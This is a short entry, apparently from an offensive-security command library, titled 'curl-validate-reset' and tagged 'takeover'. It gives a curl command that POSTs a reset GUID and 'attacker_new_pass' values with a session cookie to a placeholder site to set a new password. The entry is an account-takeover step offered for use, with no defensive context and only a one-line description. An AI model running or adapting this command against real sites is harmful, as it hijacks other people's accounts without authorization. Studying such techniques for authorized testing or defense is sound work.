---
data: >-
  curl -X POST https://target-site.com/self -H "Cookie: session=valid_session"
  -d
  "guid=reset_guid&newPassword=attacker_new_pass&confirmPassword=attacker_new_pass"
  -v
tags:
  - reset
  - takeover
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.450Z'
id: f66c6d85-dffb-45c0-87e8-09a20986d057
verified: false
validated: true
submitted: true
---
# curl-validate-reset

## Command

```bash
curl -X POST https://target-site.com/self \
  -H "Cookie: session=valid_session" \
  -d "guid=reset_guid&newPassword=attacker_new_pass&confirmPassword=attacker_new_pass" \
  -v
```

## Description

Validates reset and sets new password.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d "guid=..."` | Reset token | Yes |
| `-d "newPassword=..."` | New password | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

Password updated successfully.

## Related

- [[Related Procedure: Validate-Recovery-Email-and-Reset-Password]]
